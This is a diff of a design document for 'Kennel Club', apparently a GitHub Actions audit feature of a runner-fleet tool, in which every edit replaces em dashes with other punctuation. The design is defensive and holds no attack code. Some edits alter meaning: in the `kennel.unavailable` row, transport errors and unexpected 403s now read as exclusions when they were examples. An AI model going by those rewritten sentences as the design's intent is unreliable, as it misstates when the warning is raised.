   `metrics.go`. `internal/events/bus.go` gains the three kinds.
-* `internal/api/` — `handlers_kennel.go`; modified: `router.go`, `sse.go` if a
+* `internal/api/`: `handlers_kennel.go`; modified: `router.go`, `sse.go` if a
   frame needs filtering (none is expected: findings carry no secrets and no
   source), `api_test.go` (route table, `normalisePath`).
-* `internal/auth/rbac.go` — `kennel.read` (viewer), `kennel.recheck` (operator),
+* `internal/auth/rbac.go`: `kennel.read` (viewer), `kennel.recheck` (operator),
   `kennel.waive` (operator) and `kennel.waive_error` (admin). The fourth action
   exists so the policy table says who may waive an error and `auth.Explain` can
   name the role in the 403; the handler asks for it when the finding turns out to
   be an error. `kennel:waive_error` as a token scope implies `kennel:waive`.
 * `internal/mcp/kennel.go`.
-* `internal/config/` — `settings.go` (the five rows and the `kennel` section),
+* `internal/config/`: `settings.go` (the five rows and the `kennel` section),
   `config.go` (the `Kennel` struct, its defaults and its tidying), `validate.go`
   (four error findings, below). `kennel.fixes` waits for Stage 5: a setting
   nothing reads would be "saved" about nothing.
-* `web/` — `src/lib/shell/sections.ts`, `keys.ts`, `CommandPalette.svelte`,
+* `web/`: `src/lib/shell/sections.ts`, `keys.ts`, `CommandPalette.svelte`,
   `router.ts`; `src/routes/Kennel.svelte`, `KennelRepository.svelte`;
   `src/lib/kennel/*`; `src/lib/aicontext/AiContextCard.svelte` (extracted);
   `src/lib/api/types.ts`, `client.ts`; `src/lib/problems/ProblemItem.svelte`
@@ -1046,7 +1046,7 @@ asks ("Empty states", :945-982).
 
 | State | Overview | Repository page |
 | --- | --- | --- |
-| Off | Explanation of what it does, what it reads, what it never does, and — for an admin — "Turn on in Settings". The AI Context lens still works. | Not reachable (no row); the link says why. |
+| Off | Explanation of what it does, what it reads, what it never does, and, for an admin, "Turn on in Settings". The AI Context lens still works. | Not reachable (no row); the link says why. |
 | Empty | "Kennel Club looks at repositories your fleet has run jobs for. None yet." | A repository with no findings and full coverage is **Best in show**; with no runs yet it is *Pending*. |
 | Loading | `Skeleton` tiles; `LoadingBoundary` | `Skeleton` per tab |
 | Partial | A banner and the coverage panel: which sections are partial and why. Counts are labelled "at least". | The tab shows the coverage reason in place of findings. Never "all clear". |
@@ -1056,7 +1056,7 @@ asks ("Empty states", :945-982).
 
 Mobile: one column; the by-check table becomes cards; tabs scroll horizontally
 (`Tabs.svelte` is an ARIA tablist); no sideways page scroll at 360 and 412 px
-(`mobile.spec.ts:631`). Light and dark through the tokens only — no raw colour
+(`mobile.spec.ts:631`). Light and dark through the tokens only; no raw colour
 (`web/CLAUDE.md`); severity uses the existing severity badge and the status
 colours are not reused for anything else. Charts, if any, are inline SVG.
 
@@ -1068,7 +1068,7 @@ no public sentence, `status_test.go:18-38`):
 | Code | Severity | Audience | Raised when |
 | --- | --- | --- | --- |
 | `kennel.exposure` | error | fleet | A repository has an open, unwaived *error* exposure finding. One problem for the fleet, with the count of repositories in its title and none of them named, `TargetKind: "kennel"` and no ID, linking to the list narrowed to errors ([0009](decisions/0009-the-problems-list-says-one-thing-for-kennel-club.md)); it was one for each repository at first. A warning-only repository raises nothing: it appears in Kennel Club and nowhere else. |
-| `kennel.unavailable` | warning | platform | Kennel Club is on but could not complete a remote read for an installation for six hours for a reason other than a permission the operator chose not to grant — repeated transport errors, or an unexpected 403. A *declined* permission is a coverage state, never a problem. |
+| `kennel.unavailable` | warning | platform | Kennel Club is on but could not complete a remote read for an installation for six hours for a reason other than a permission the operator chose not to grant, repeated transport errors, or an unexpected 403. A *declined* permission is a coverage state, never a problem. |
 
 Neither carries a `Remedy`: remedy kinds are only `pool.update` and
 `host.update` (`internal/controller/remedy.go:26-28`), and neither applies. The
@@ -1099,7 +1099,7 @@ is edited.
   `docs/kennel-club.md`; the existing problem-code, configuration-key and
   screenshot tests.
 * *Playwright, against the built binary*: `kennel.spec.ts` on both the desktop
-  and mobile projects — navigation by the bar, the sheet, the `g k` chord;
+  and mobile projects, navigation by the bar, the sheet, the `g k` chord;
   every state in the table above; the repository page tabs by address and by
   back button; waive and unwaive; recheck. `a11y.spec.ts` gains the new routes
   in `PAGES`. `hostile-input.spec.ts` gains an evidence ref that is markup.
@@ -1121,12 +1121,12 @@ is edited.
 **Docs to write.** `docs/kennel-club.md` (new: what it checks and why, every
 check as a row, what it reads, what it never does, permissions, how to turn a
 section off, how to read the "Best in show" badge) and an entry in `mkdocs.yml`;
-`docs/ui.md` (a `## Kennel Club` heading — required by `internal/docs/ui_test.go:67`
+`docs/ui.md` (a `## Kennel Club` heading, required by `internal/docs/ui_test.go:67`
 for every `label:` in `sections.ts`); `docs/problem-codes.md` (two runtime rows and four validator rows);
 `docs/configuration.md` (five keys, three places each); `docs/api-surface.md`
 (routes, the two event kinds); `docs/metrics.md`; `docs/ai-context.md` and
 `docs/ui.md:574-593` (paths); `docs/ui-guidelines.md` (§2 order, Keyboard,
-Responsive — which is **already stale**: it lists eleven entries where
+Responsive, which is **already stale**: it lists eleven entries where
 `sections.ts` has thirteen, and the phone-bar list is out of date, so fix it
 rather than extend it); `docs/security.md` (what Kennel Club reads, the
 allow-list, what is tested); `docs/architecture.md` (a Components row and a
@@ -1193,13 +1193,13 @@ paragraph); `docs/cli.md` and `docs/connect-claude.md` (the three tools);
 
 **Goal and outcome.** The **Storage** tab says what a repository's Actions
 artifacts and caches are using, by name, how long they are kept, and what the
-default prune rule would free — as a **dry run**. Nothing is deleted. A workflow
+default prune rule would free, as a **dry run**. Nothing is deleted. A workflow
 GitHub silently disabled is called out.
 
 **In scope.** Artifact usage by name; cache usage against the repository's
 limit; `GET …/actions/workflows` states; the pure `PlanPrune`; the Storage tab;
 `storage.artifacts_large`, `storage.caches_near_limit`, `ci.workflow_auto_disabled`.
-**Out.** Deleting anything; GHCR (decision: ship without, verify later — the
+**Out.** Deleting anything; GHCR (decision: ship without, verify later; the
 reader returns `ErrUnsupported`, the tab says container packages cannot be read
 with a GitHub App token, and nothing is guessed); org-level billing (not
 readable by the App).
@@ -1207,8 +1207,8 @@ readable by the App).
 **Packages and files.** `internal/kennel/storage.go`, `prune.go` and tests;
 `internal/github/kennel_reader.go` gains `ArtifactUsage`, `CacheUsage`,
 `CacheStorageLimit`, `ListCaches`, `Workflows`. The artifact pager already exists
-for AI Context — `ContextArtifactUsage` pages 100 at a time to a ten-page cap and
-keeps the top three groups (`internal/github/ai_context_runs.go:227-274`) — so it
+for AI Context, `ContextArtifactUsage` pages 100 at a time to a ten-page cap and
+keeps the top three groups (`internal/github/ai_context_runs.go:227-274`), so it
 is **extracted** into a shared function both callers use, rather than copied.
 
 **Data model.** None. Storage facts are recomputed each refresh and the
@@ -1216,7 +1216,7 @@ evaluation they feed is already persisted.
 
 **The default prune rule, as a pure function.** There is no precedent to copy
 (`artifact-prune.sh` does not exist), so this is designed from the GHCR scripts'
-principles — reference-aware, graced, fail closed:
+principles, reference-aware, graced, fail closed:
 
 ```go
 func PlanPrune(a []Artifact, runs map[int64]RunState, p PrunePolicy) PrunePlan
@@ -1231,7 +1231,7 @@ is kept**: an artifact whose run could not be read is not selected. The plan
 reports `Complete` only if every listing was read in full; a truncated listing
 yields `bytes: "at least"` and `Deletable: false`. `Deletable` is computed now,
 by the same function a future delete path would call, so that path inherits the
-fail-closed behaviour instead of reinventing it — but **no stage calls it**.
+fail-closed behaviour instead of reinventing it, but **no stage calls it**.
 
 **API.** `GET /kennel/repositories/{id}/storage` (viewer) returns artifact
 groups (name through the same gate as `artifactName`, count, bytes, oldest
@@ -1247,7 +1247,7 @@ Mobile: the usage table becomes a list.
 
 **Problem codes.** None.
 
-**Tests.** *Pure:* `PlanPrune` as a table — in-progress run kept, newest-N kept,
+**Tests.** *Pure:* `PlanPrune` as a table, in-progress run kept, newest-N kept,
 latest default-branch run kept, unknown run kept, partial listing → not
 `Deletable`; a hostile artifact name; the thresholds. *Fake GitHub:* artifact
 and cache routes with real paging (the fake pages artifacts already,
@@ -1286,8 +1286,8 @@ catalogue's Stage 3 rows; the permission grant flow, the manifest options and th
 installer questions; the sharpening of `exposure.target_event_ran`, which joins a
 run to the workflow file that produced it. The join is allowed **only** for the
 events whose workflow is defined on the default branch (`pull_request_target`,
-`workflow_run`, `issue_comment`, `issues`), and it is a *membership test* — is this
-run's path one of the files already in the snapshot? — never an echo. For a fork's
+`workflow_run`, `issue_comment`, `issues`), and it is a *membership test* (is this
+run's path one of the files already in the snapshot?) never an echo. For a fork's
 `pull_request` run the path is named by the fork's author and is not used at all
 (section 7). **Out.**
 Remote reusable workflows and composite actions (their contents are not read; a
@@ -1327,7 +1327,7 @@ tell "denied" from "empty": GitHub answers an App without Contents exactly as it
 answers a repository with no workflows (`docs/configuration.md:869-872`), and the
 fake deliberately mimics it (`fake.go:501-507`). So this section's coverage state
 comes from the **granted permission set in `AppInfo`** (`CanReadContents()`),
-never from a 404. A test pins that; the alternative would report "no workflows —
+never from a 404. A test pins that; the alternative would report "no workflows,
 all clear" for every repository whose owner had not yet accepted the permission,
 which is the most dangerous false negative in the plan.
 
@@ -1344,7 +1344,7 @@ untouched and one calm row.
 **Problem codes.** None; a declined permission is not a problem.
 
 **Tests.** *Pure:* a parser table covering every shape in the catalogue; **hostile
-input** — a billion-laughs alias bomb, a 10 MB file, 10,000 levels of nesting,
+input**; a billion-laughs alias bomb, a 10 MB file, 10,000 levels of nesting,
 invalid UTF-8, a duplicate-key file, a `uses:` and a job id carrying markup or a
 path traversal, an enormous scalar; `FuzzParseWorkflow` registered with the
 existing `fuzz.yml`. *Fake GitHub:* a `contents` permission gate, directory
@@ -1396,12 +1396,12 @@ before any "never reports" judgement, because rulesets alone would call a
 classically protected repository unprotected.
 
 **Two traps the tests must pin.** `GET …/protection` answers **404 "Branch not
-protected"** when there is none — normal, not `unavailable`. And Administration
+protected"** when there is none, normal, not `unavailable`. And Administration
 endpoints answer **403** without the permission (unlike Contents). A required
 check is judged only when it is pinned to the GitHub Actions app (a check with
 "any source" might come from another app and is skipped), only when at least 20
 jobs were seen in the window (fewer is *unknown*, because a delivery gap looks
-identical to a missing check), and its name is **never echoed** — the finding
+identical to a missing check), and its name is **never echoed**; the finding
 carries a count and a link to the settings page.
 
 **Data model.** None. **API.** The `protection` area fills in on the repository
@@ -1421,11 +1421,11 @@ write held) versus an org App (denied) in the permission tests; the "fewer than
 20-job floor; echo a check name.
 
 **Docs.** The Protection and settings sections of `docs/kennel-club.md`;
-`docs/security.md` — the Administration-read disclosure from section 4.
+`docs/security.md`; the Administration-read disclosure from section 4.
 
 **Risks.** Administration read is broader than what is used (mitigated by the
 allow-list test and by saying so); rulesets and classic protection overlap and
-GitHub changes both (every endpoint is a capability probe — 404 or 405 becomes
+GitHub changes both (every endpoint is a capability probe, 404 or 405 becomes
 `unavailable`).
 
 **Effort.** M. **Acceptance.** Each finding fires on its fixture, is silent on
@@ -1465,7 +1465,7 @@ the migration wizard's review step (`StepReview.svelte`).
 
 **Line-level edits, not re-serialisation.** The planner changes lines in place,
 the way `internal/migrate/runson.go` rewrites one `runs-on` line "and nothing
-else in the file" (`docs/architecture.md:327`) — re-marshalling YAML would
+else in the file" (`docs/architecture.md:327`), re-marshalling YAML would
 reorder keys, drop comments and rewrite every file it touched. `VerifyEdit`
 re-parses the edited file and asserts that the diff touches only the lines the
 plan lists and changes only the intended facts. A plan that cannot be verified
@@ -1505,8 +1505,8 @@ succeed without the preview's hash.
 
 **Docs.** `docs/kennel-club.md` (what each fix changes, with the diff);
 `docs/security.md` blast-radius table; `docs/migration.md:244`, which says the
-wizard is "the only thing in Zoomies that writes to a repository" — **already
-untrue** since AI Context opens setup pull requests — corrected here.
+wizard is "the only thing in Zoomies that writes to a repository" (**already
+untrue** since AI Context opens setup pull requests) corrected here.
 
 **Risks.** A wrong timeout kills a legitimate job (the history floor and the
 "needs your number" path); pin resolution is the riskiest edit and is the
@@ -1518,7 +1518,7 @@ contains; the pull request contains nothing else; nothing is written without all
 three consents (permission, `kennel.fixes`, the confirmed preview); a lost
 response never produces two pull requests.
 
-### Stage 6 (ZF-229f): fix a setting — deferred
+### Stage 6 (ZF-229f): fix a setting: deferred
 
 **Owner decision taken in this session:** never ask an organisation App for
 Administration: write. This stage is therefore **recorded and not scheduled**.
@@ -1561,7 +1561,7 @@ that structural rather than a matter of discipline:
 | Data | Who controls it | Handling |
 | --- | --- | --- |
 | Workflow file text, `name:` values, step names, `uses:` strings | Anyone who can push | Parsed into typed facts and discarded. The only text kept is a reference that passes the closed grammar in `refs.go`; everything else becomes a count or an "unusual name" sentence. |
-| A workflow **path** on a *fork's* `pull_request` run | **The fork's author**, who names the file | Never used. For events whose workflow is defined on the default branch (`pull_request_target`, `workflow_run`, `issue_comment`, `issues`) the path may be joined to a file already in the snapshot by *membership test* — it is matched, never echoed. This is the one place a stranger's text reaches Kennel Club's inputs, so the evidence for a fork run is its numeric run ID and a link, and a test feeds a hostile path through it. |
+| A workflow **path** on a *fork's* `pull_request` run | **The fork's author**, who names the file | Never used. For events whose workflow is defined on the default branch (`pull_request_target`, `workflow_run`, `issue_comment`, `issues`) the path may be joined to a file already in the snapshot by *membership test*; it is matched, never echoed. This is the one place a stranger's text reaches Kennel Club's inputs, so the evidence for a fork run is its numeric run ID and a link, and a test feeds a hostile path through it. |
 | Required-check names, ruleset names, branch names | Repository admins and collaborators | Counted, never echoed. The sentence says "2 required checks" and links to GitHub's page. |
 | Artifact and cache names and keys | Any job | Through the same gate as `artifactName` (`internal/aicontext/diagnosis.go:410`); otherwise "an artifact with an unusual name". |
 | Run metadata (actor, head branch, titles, the workflow's path) | Anyone | Not read at all. Only `event` and the head and base repository IDs are taken from a run, and the event is bounded to 64 bytes and passed through an allow-list (`kennel.NormalizeEvent`), so a name the evaluator does not know is "other". |
@@ -1585,7 +1585,7 @@ API base, already validated at write time by `config.CheckOutboundURL`
 (`internal/config/egress.go:65-90`). It adds no URL setting and **fetches no URL
 that repository content names**. Stage 5 resolves a tag by building a path from
 an owner, repository and tag that passed a grammar check, on the same host,
-through go-github — never from a raw string. The conditional-request transport is
+through go-github, never from a raw string. The conditional-request transport is
 keyed by installation and URL and never shared between installations, so one
 tenant's cached response is never served to another; it never persists a token.
 `TestTheInstallationTokenNeverReachesASecondHost` is modelled on
@@ -1617,8 +1617,8 @@ proves the token is never sent to the log host.
 
 `kennel.read` is **viewer**: findings carry no source, no secret and no repository
 text, and viewers can already see jobs by repository, so reading them reveals
-nothing new. Source access stays where it is — AI Context's explicit-membership
-model — and the AI Context tab calls the same routes with the same gates, so
+nothing new. Source access stays where it is, AI Context's explicit-membership
+model, and the AI Context tab calls the same routes with the same gates, so
 Kennel Club cannot widen it. `kennel.recheck` and `kennel.waive` are operator,
 and waiving an *error* finding is `kennel.waive_error`, which is admin. Ending a
 waiver needs only `kennel.waive`. `kennel.fix` is admin.
@@ -1673,7 +1673,7 @@ Club could not fully read is never "Best in show".
   `0080`, which creates two empty tables. A pre-migration copy of the database is
   already taken when migrations are pending (`internal/store/store.go`, around
   380-435), and migrations are one-way, so an older binary refuses the new
-  schema (`ErrSchemaNewer`; `docs/upgrading.md:601`) — the docs say so in one
+  schema (`ErrSchemaNewer`; `docs/upgrading.md:601`); the docs say so in one
   line. Nothing else changes: no new permission, no new event, no new setting
   turned on. `zoomies upgrade` never touches it, consistently with the root
   `CLAUDE.md` rule that the upgrade flow opens no tuning menu.
@@ -1714,12 +1714,12 @@ the issues people open. The measures are chosen so each is answerable from those
   findings are mostly *closed by a change* is doing its job.
 * **Time to close.** Median age of a finding at closure, per code, from `since`.
 * **Coverage.** The share of served repositories that are `attention` or
-  `best_in_show` — that is, fully read. A low share means permissions or budget,
+  `best_in_show`; that is, fully read. A low share means permissions or budget,
   not repositories, are the problem.
 * **Stage 5 pull requests.** Of those opened, how many merged (the finding is
   gone at the next evaluation) against closed unmerged.
 * **It changed a decision.** A public repository moved off a weak pool, a
-  `timeout-minutes` landed, a pin updater appeared — recorded in the maintainers'
+  `timeout-minutes` landed, a pin updater appeared, recorded in the maintainers'
   own fleet notes, because no counter can see it.
 
 **How we would know it is noisy.**
@@ -1728,7 +1728,7 @@ the issues people open. The measures are chosen so each is answerable from those
   days. Above 40% with at least ten shown, the check is wrong for this audience:
   demote its severity, narrow it, or retire it.
 * **Never acted on.** A code with findings open for 60 days, no fix and no
-  waiver, is probably unread — the title or the severity is wrong.
+  waiver, is probably unread; the title or the severity is wrong.
 * **Recheck-and-still-open.** Operators who press Recheck on a finding they
   believe fixed and see it return: suspect a false positive.
 * **Reported false positives.** An issue label, counted per code.
@@ -1794,7 +1794,7 @@ made rather than asked, and each is cheap to reverse before Stage 1 merges.
   but GitHub's CodeQL analyses Actions workflows for it and does so with data
   flow. Revisit only if operators say CodeQL is not on, and only for the handful
   of contexts that are unambiguous.
-* **Deleting anything — artifacts, caches, packages.** No stage deletes. If a
+* **Deleting anything: artifacts, caches, packages.** No stage deletes. If a
   delete path is ever proposed it needs, at least: an exact preview listing what
   would go and why; a typed confirmation of the repository's full name and the
   count; an audit row carrying the plan hash; fail-closed behaviour when any
@@ -1851,7 +1851,7 @@ read on 6 October 2026.
 | 4 | `GET /repos/{r}/rules/branches/{b}` | Metadata: read | Ruleset required checks |
 | 5 | `GET /repos/{o}/{a}/git/ref/tags/{t}`, `…/git/tags/{sha}` | none beyond reading the action's repository | Resolve a tag to a commit |
 | 5 | Git Data API (`trees`, `commits`, `refs`) and `POST /repos/{r}/pulls` | Contents, Pull requests, Workflows: write | Open the pull request |
-| — | *Never:* `bypass_actors`, collaborators, teams, deploy keys, secrets, any `DELETE`, any `PUT` or `PATCH` to a setting | | |
+| - | *Never:* `bypass_actors`, collaborators, teams, deploy keys, secrets, any `DELETE`, any `PUT` or `PATCH` to a setting | | |
 
 ## Appendix B: what was checked, and what was not
 
@@ -1868,10 +1868,10 @@ migration and its store and API, `internal/scheduler/advice.go`, the two GHCR
 prune scripts and the workflow that runs them, `internal/docs/*_test.go`, and the
 UI's navigation, router, keys and tabs. Three explorers were used for the wide
 sweeps (the AI Context precedents; the GitHub client and App; the UI, API, events,
-MCP and settings); I re-read the claims the design leans on —
-the manifest, `Probe`, `InstallationsFreshSince`, `statusExempt`, the nav and
+MCP and settings); I re-read the claims the design leans on
+(the manifest, `Probe`, `InstallationsFreshSince`, `statusExempt`, the nav and
 chord lists, the page-count test, `Pool.Dangerous`, `RunnerGroup` and the existing
-`yaml.Node` workflow tests — against the code myself.
+`yaml.Node` workflow tests) against the code myself.
 
 **Read in GitHub's documentation:** the consolidated permissions page for GitHub
 Apps (Administration read covers the Actions settings, fork-approval, token
